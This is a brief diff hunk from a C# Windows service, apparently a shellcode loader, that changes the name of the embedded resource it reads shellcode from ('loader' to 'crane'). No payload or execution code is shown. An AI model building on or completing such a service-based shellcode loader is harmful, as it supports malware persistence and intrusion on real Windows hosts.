@@ -88,7 +88,7 @@ namespace WindowsService1
             ServiceStatus serviceStatus = new ServiceStatus();
             serviceStatus.dwCurrentState = ServiceState.SERVICE_RUNNING;
             SetServiceStatus(this.ServiceHandle, ref serviceStatus);
-            byte[] shellcode = GetResource("loader");
+            byte[] shellcode = GetResource("crane");
             if (shellcode.Length > 0)
             {
                 //_eventLog1.WriteEntry($"shellcode length: {shellcode.Length}");
